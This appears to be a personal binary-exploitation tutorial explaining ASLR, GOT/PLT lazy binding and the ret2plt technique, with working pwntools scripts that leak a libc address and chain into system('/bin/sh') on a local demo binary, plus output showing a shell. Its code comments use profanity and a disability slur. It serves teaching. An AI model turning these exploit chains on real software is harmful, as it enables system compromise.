# Ret2plt:
Ret2plt is a popular exploitation technique derived of ROP and ret2libc but is primarily used on binaries that not only have NX-enabled, but also ASLR enabled system-wide. We can check to see if ASLR is on or not with this simple command (You'll need to sudo it more than likely): ``cat /proc/sys/kernel/randomize_va_space``. We can tell if ASLR is set or not if it's a 0 : ``off`` or a 2 : ``on``.

# ASLR (For linux):
What the fuck is ASLR? ASLR stands for: address space layout randomization; any takers on what this means in the context of an executable? Shared object library base address randomize! This completely randomizes where our shared object libraries that are common in a lot of our programs such as libc are now loaded into memory at random places, but this is still able to be bypassed due to the fact that ASLR uses absolute address randomization, so the offsets between function addresses remain the same, just not the place the shared object is loaded into. Now this completely fucks up our older techniques because we hardcoded addresses in our binaries exploit, we cannot do this now due to the fact that ASLR randomizes the base addresses of shared object libraries in our programs addressing space, but not our actual binaries addresses this is another exploit mitigation known as PIE / PIC. Let's see it in action:
```
   ~/Desktop/binexp/stack/ROP/ret2plt ❯ ldd ./demo                                                                           1.64   8.22G  100%
	linux-vdso.so.1 (0x00007ffd40d63000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007f54844df000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f54846cf000)
   ~/Desktop/binexp/stack/ROP/ret2plt ❯ ldd ./demo                                                                           1.63   8.22G  100%
	linux-vdso.so.1 (0x00007ffcd25cb000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007fd78614f000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fd78633f000)
   ~/Desktop/binexp/stack/ROP/ret2plt ❯ ldd ./demo                                                                           1.63   8.22G  100%
	linux-vdso.so.1 (0x00007ffe16383000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007f07f851f000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f07f870f000)
   ~/Desktop/binexp/stack/ROP/ret2plt ❯ ldd ./demo                                                                           1.63   8.22G  100%
	linux-vdso.so.1 (0x00007ffc361b3000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007fc6d4a8f000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fc6d4c7f000)
   ~/Desktop/binexp/stack/ROP/ret2plt ❯ cat /proc/sys/kernel/randomize_va_space                                              1.63   8.22G  100%
2

```

# GOT and PLT:
The ``GOT`` and the ``PLT`` are 2 major aspects of dynamic linking shared object libraries to our binary. These 2 aspects of indirection that's arrived from the problem of: ASLR messing with hardcoded addresses for functions in dynamically linked libraries and having to constantly recompile every single binary that uses said function every time a new libc update is pushed. So how does it work? Your program won't hold the actual code for a function like ``puts``, instead it'll call a ``puts@plt`` stub to either jump to a GOT entry, or resolve a function address that's not already been resolved using ``dl_runtime_resolve_xsave()``. This process is known as lazy binding. Once the function is resolved your program will just jump to the an entry in the GOT which calls the function you desire. Let's visualize this process:

# Lazy binding:
Lazy binding is the process of PLT checking to see if a function address has been resolved or not. Some C pseudo-code would look like this:
```c
_Bool printf@got_resolved = False;

if(printf@got_resolved == False)
{
   push 0x0; // Concurrent index that's pushed every time a symbol is resolved to keep track .dymsym section.
   call dl_runtime_resolve_xsave();
}

else
{
   jmp printf@got;
}
```

# Ret2plt technique demystified: 
This technique is relatively easy once you get the idea of ROP, the PLT, and the GOT; so we remember in our **GOT and PLT** explanation that jumping to the GOT entry of a function inherently calls the function as well, so what we can do is make use of a ``pop rdi ; ret`` gadget, pop the address of the GOT entry onto the stack and into ``rdi`` then we jump to the ``PLT`` stub which jumps to the GOT entry and calls ``puts()`` allowing us to the leak the address of ``puts()`` libc function and print it by calling ``puts()``. After we take this leak and clean formatting of the leaked address that we print to ``stdout`` we can find the other offsets of functions in libc from it and just add and subtract from leaked addresss with other offsets to libc functions to find their real addresses and just ``jmp`` to them, like ``system()`` for example (basic ret2libc after that). This is a really cool and effective technique for bypassing ASLR and NX. So let's see what it looks like:

# Exploitation:
Let's see what a ``puts@plt`` leak looks like with this code:
```py
#!/bin/python3

# Pwntools
from pwn import *

# Process information
p = process("./demo")
binary = ELF("./demo", checksec=False)
libc = ELF("/usr/lib/libc.so.6", checksec=False)

# Process context information for debugging
context.os = "linux"
context.arch = "amd64"
context.endian = "little"
context.log_level = "debug"

# Return address offset and padding
rip_offset = 72
rip_padding = b"A" * rip_offset

# Offsets to functions in our binary.
main     = p64(binary.sym["main"])
puts_plt = p64(binary.plt["puts"])
puts_got = p64(binary.got["puts"])

# ROP gadget
pop_rdi = p64(0x401263)

# Payload to leak the address of puts() from got GOT entry.
leak_payload = rip_padding  # Access return address
leak_payload += pop_rdi     # Pop top of the stack into rdi
leak_payload += puts_got    # Push dis bitch on the stack to print da hoe
leak_payload += puts_plt    # Jumping to the PLT stub of puts() to call puts() directly.
leak_payload += main        # Reiterate over main.

p.sendline(leak_payload)
p.recvline() # Junk recieve because pwntools is autistic.

puts_addr_leak = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) # Calling puts() to leak the address of puts()
libc_base = puts_addr_leak - libc.sym["puts"]

# Setting the libc base address to our leak
libc.address = libc_base

# Debugging
log.success(f"Libc : {hex(libc_base)}")
log.success(f"Puts : {hex(puts_addr_leak)}")

p.interactive()
```
produces:
```
[+] Starting local process './demo': pid 56365
[DEBUG] Sent 0x69 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  63 12 40 00  00 00 00 00  │AAAA│AAAA│c·@·│····│
    00000050  18 40 40 00  00 00 00 00  30 10 40 00  00 00 00 00  │·@@·│····│0·@·│····│
    00000060  82 11 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000069
[DEBUG] Received 0x2b bytes:
    00000000  4c 6f 6f 6b  73 20 66 69  6e 65 20 74  6f 20 6d 65  │Look│s fi│ne t│o me│
    00000010  21 0a b0 5a  db ae a4 7f  0a 4c 6f 6f  6b 73 20 66  │!··Z│····│·Loo│ks f│
    00000020  69 6e 65 20  74 6f 20 6d  65 21 0a                  │ine │to m│e!·│
    0000002b
[+] Libc : 0x7fa4aed3f000
[+] Puts : 0x7fa4aedb5ab0
[*] Switching to interactive mode
Looks fine to me!
$ 
```
Note that ``libc`` addresses will most likely start with ``0x7f`` and end with ``000``, that's a good hint to know if you're leaking memory addresses in libc or not. But from the looks of it we can clearly see leaked libc addresses. Awesome! So we now that we have leaked a libc address we can pop a shell by doing ret2libc via taking our ``libc_base = leaked_puts_addr - puts_offset`` which result in the base of libc being revealed and we can find other offsets for functions by using the base and preforming: ``libc.address = libc_base ; system = libc.sym["system"]`` which simply sets the base address of derandomized base address we leaked to the real base address of libc, and from there we can just use pwntools to find where everything in libc is stored! Shell time!

# Shell!!!:
Our final exploit:
```py
#!/bin/python3

# Pwntools
from pwn import *

# Process information
p = process("./demo")
binary = ELF("./demo")
libc = ELF("/usr/lib/libc.so.6")

# Process context information for debugging
context.os = "linux"
context.arch = "amd64"
context.endian = "little"
context.log_level = "debug"

# Return address offset and padding
rip_offset = 72
rip_padding = b"A" * rip_offset

# Offsets to functions in our binary.
main     = p64(binary.sym["main"])
puts_plt = p64(binary.plt["puts"])
puts_got = p64(binary.got["puts"])

# ROP gadget
pop_rdi = p64(0x401263)
ret_ali = p64(0x40101a)

# Payload to leak the address of puts() from got GOT entry.
leak_payload = rip_padding  # Access return address
leak_payload += pop_rdi     # Pop top of the stack into rdi
leak_payload += puts_got    # Push dis bitch on the stack to print da hoe
leak_payload += puts_plt    # Jumping to the PLT stub of puts() to call puts() directly.
leak_payload += main        # Reiterate over main.

p.sendline(leak_payload)
p.recvline() # Junk recieve because pwntools is autistic.

puts_addr_leak = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) # Calling puts() to leak the address of puts()
libc_base = puts_addr_leak - libc.sym["puts"]

# Setting the libc base address to our leak
libc.address = libc_base

# Debugging
log.success(f"Libc : {hex(libc_base)}")
log.success(f"Puts : {hex(puts_addr_leak)}")

# Final shell payload
payload = rip_padding 
payload += ret_ali
payload += pop_rdi
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols["system"])

# We win!
p.sendline(payload)
p.interactive()
```
The ``ret_ali`` ROP gadget is for stack alignment so our exploit works because the ``MOVAPS`` SIMD instruction is a bitch and unaligns our stack so we 8-byte align it with a useless 8-byte wide instruction like a useless "ret". Here's a sample from ``https://ropemporium.com/guide.html``:
```
Common pitfalls

Here are some issues you may encounter, the causes of which aren't immediately obvious.

The MOVAPS issue
If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.
```

The execution of this exploit looks as such:
```
   ~/Desktop/binexp/stack/ROP/ret2plt ❯ ./exploit.py                                                                         1.17   8.22G  100%
[+] Starting local process './demo': pid 56591
[*] '/home/layta/Desktop/binexp/stack/ROP/ret2plt/demo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] Sent 0x69 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  63 12 40 00  00 00 00 00  │AAAA│AAAA│c·@·│····│
    00000050  18 40 40 00  00 00 00 00  30 10 40 00  00 00 00 00  │·@@·│····│0·@·│····│
    00000060  82 11 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000069
[DEBUG] Received 0x2b bytes:
    00000000  4c 6f 6f 6b  73 20 66 69  6e 65 20 74  6f 20 6d 65  │Look│s fi│ne t│o me│
    00000010  21 0a b0 da  ca 4c ec 7f  0a 4c 6f 6f  6b 73 20 66  │!···│·L··│·Loo│ks f│
    00000020  69 6e 65 20  74 6f 20 6d  65 21 0a                  │ine │to m│e!·│
    0000002b
[+] Libc : 0x7fec4cc37000
[+] Puts : 0x7fec4ccadab0
[DEBUG] Sent 0x69 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  1a 10 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000050  63 12 40 00  00 00 00 00  62 2b dc 4c  ec 7f 00 00  │c·@·│····│b+·L│····│
    00000060  e0 0d c8 4c  ec 7f 00 00  0a                        │···L│····│·│
    00000069
[*] Switching to interactive mode
Looks fine to me!
$ echo "Doesn't look fine to me though!"
[DEBUG] Sent 0x27 bytes:
    b'echo "Doesn\'t look fine to me though!"\n'
[DEBUG] Received 0x20 bytes:
    b"Doesn't look fine to me though!\n"
Doesn't look fine to me though!
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x6 bytes:
    b'layta\n'
layta
$  
```

This concludes my explanation on the popular ret2plt ROP technique that is commonly used in many many exploit technique chains for bypassing mitigations set by our binary and our system :)

If you see any improvements regarding my explanation, feel free to yell at me on discord: ``f(x)#1006``!
